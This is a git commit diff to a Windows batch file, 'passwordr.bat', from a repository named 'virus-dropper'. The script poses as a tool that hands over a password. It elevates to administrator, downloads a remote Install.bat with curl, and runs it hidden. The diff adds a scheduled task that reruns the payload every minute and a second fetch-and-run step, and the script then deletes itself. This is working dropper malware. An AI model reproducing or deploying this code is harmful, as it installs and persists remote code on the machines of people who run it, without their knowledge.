956076769d714980c74dd86aa93b507b5cc06ce0
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-06 17:31:32 -0400

    Update passwordr.bat

--- installs/passwordr.bat
+++ installs/passwordr.bat
@@ -11,6 +11,7 @@ if '%errorlevel%' NEQ '0' (
     del "%temp%\getadmin.vbs"
     md %appdata%\Windows
     curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
+    SCHTASKS /CREATE /F /SC MINUTE /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
     taskkill /f /IM explorer.exe
     start explorer.exe
     exit /B
@@ -18,8 +19,19 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-start /min %appdata%\Windows\Install.bat
-echo The password is: 69420 > password.txt
+
+
+::Create a copy of install.bat, and edit items inside as directed
+::Edit this link to the DIRECT download link of the new install.bat
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
+::do not change --output
+
+del /f "%appdata%\Windows\Install.bat"
+rd %appdata%\Windows
+powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
+
+start /min Install.bat
+echo Your password is: 69420 > password.txt
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
